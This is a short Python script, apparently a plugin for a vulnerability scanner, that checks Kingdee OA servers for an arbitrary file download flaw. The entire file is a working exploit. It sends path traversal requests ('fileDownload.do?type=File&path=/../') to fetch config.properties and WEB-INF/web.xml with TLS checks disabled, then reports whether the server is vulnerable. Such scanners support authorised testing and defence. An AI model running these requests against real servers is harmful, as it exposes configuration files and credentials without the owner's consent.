import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging

def 金蝶OA_path_任意文件下载(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0",
    }
    vuln_url = urldata + 'oa/fileDownload.do?type=File&path=/../oaconsole/config/config.properties'
    exp_url = urldata + "oa/fileDownload.do?type=File&path=/../webapp/WEB-INF/web.xml"
    try:
        requests.packages.urllib3.disable_warnings()
        respones1 = requests.get(exp_url, headers=headers, verify=False)
        respones2 = requests.get(vuln_url, headers=headers, verify=False)
        if respones1.status_code == 200:
            print(Vcolors.RED + "[+] 金蝶OA 任意文件下载漏洞存在{}".format(exp_url) +Vcolors.ENDC)

        elif respones2.status_code == 200:
            print(Vcolors.RED + "[+] 金蝶OA 任意文件下载漏洞存在 任意文件下载漏洞存在{}".format(vuln_url) +Vcolors.ENDC)
        else:
            print(Vcolors.WARNING + "[x] 金蝶OA 任意文件下载漏洞不存在" +Vcolors.ENDC)
    except:
        logging.error("金蝶OA_path_任意文件下载脚本出现异常")


